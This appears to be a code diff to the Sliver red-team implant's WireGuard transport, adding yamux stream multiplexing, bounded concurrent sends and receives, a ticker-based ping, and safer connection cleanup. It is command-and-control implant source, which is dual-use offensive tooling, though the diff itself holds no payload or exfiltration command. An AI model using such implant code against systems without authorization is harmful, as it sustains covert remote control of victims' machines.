@@ -36,6 +36,10 @@ import (
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
+
+	// {{end}}
+
+	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
 	"github.com/hashicorp/yamux"
 
 	// {{end}}
@@ -383,9 +387,11 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
 	ctrl := make(chan struct{})
+	done := make(chan struct{})
 
 	var conn net.Conn
 	var dev *device.Device
+	var muxSession *yamux.Session
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -399,8 +405,16 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[wg] lost connection, cleanup...")
 			// {{end}}
-			conn.Close()
-			dev.Down()
+			close(done)
+			if muxSession != nil {
+				muxSession.Close()
+			}
+			if conn != nil {
+				conn.Close()
+			}
+			if dev != nil {
+				dev.Down()
+			}
 			close(recv)
 		},
 	}
@@ -439,45 +453,121 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		if err != nil {
 			return err
 		}
+		if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
+			conn.Close()
+			dev.Down()
+			return err
+		}
+		muxSession, err = yamux.Client(conn, nil)
+		if err != nil {
+			conn.Close()
+			dev.Down()
+			return err
+		}
 		connection.IsOpen = true
 
 		go func() {
 			defer connection.Cleanup()
+			sendSem := make(chan struct{}, 64)
+			ticker := time.NewTicker(wireguard.PingInterval)
+			defer ticker.Stop()
+
+			sendEnvelope := func(envelope *pb.Envelope) {
+				if envelope == nil {
+					return
+				}
+				select {
+				case sendSem <- struct{}{}:
+				case <-done:
+					return
+				}
+				go func(envelope *pb.Envelope) {
+					defer func() {
+						<-sendSem
+					}()
+					stream, err := muxSession.Open()
+					if err != nil {
+						connection.Cleanup()
+						return
+					}
+					defer stream.Close()
+					if err := wireguard.WriteEnvelope(stream, envelope); err != nil {
+						connection.Cleanup()
+						return
+					}
+				}(envelope)
+			}
+
+			sendPing := func() {
+				select {
+				case sendSem <- struct{}{}:
+				case <-done:
+					return
+				}
+				go func() {
+					defer func() {
+						<-sendSem
+					}()
+					stream, err := muxSession.Open()
+					if err != nil {
+						connection.Cleanup()
+						return
+					}
+					defer stream.Close()
+					if err := wireguard.WritePing(stream); err != nil {
+						connection.Cleanup()
+						return
+					}
+				}()
+			}
+
 			for {
 				select {
 				case envelope, ok := <-send:
 					if !ok {
 						return
 					}
-					err := wireguard.WriteEnvelope(conn, envelope)
-					if err != nil {
-						return
-					}
-				case <-time.After(wireguard.PingInterval):
-					err = wireguard.WritePing(conn)
-					if err != nil {
-						return
-					}
+					sendEnvelope(envelope)
+				case <-ticker.C:
+					sendPing()
+				case <-done:
+					return
 				}
 			}
 		}()
 
 		go func() {
 			defer connection.Cleanup()
+			streamSem := make(chan struct{}, 128)
 			for {
-				envelope, err := wireguard.ReadEnvelope(conn)
-				if err == io.EOF {
-					// {{if .Config.Debug}}
-					log.Printf("[wireguard] eof")
-					// {{end}}
+				stream, err := muxSession.Accept()
+				if err != nil {
 					return
 				}
-				if err != io.EOF && err != nil {
-					break
+
+				select {
+				case streamSem <- struct{}{}:
+				case <-done:
+					stream.Close()
+					return
 				}
-				if envelope != nil {
-					recv <- envelope
-				}
+
+				go func() {
+					defer func() {
+						<-streamSem
+					}()
+					defer stream.Close()
+					envelope, err := wireguard.ReadEnvelope(stream)
+					if err != nil {
+						return
+					}
+					if envelope != nil {
+						select {
+						case recv <- envelope:
+						case <-done:
+						}
+					}
+				}()
 			}
 		}()
 
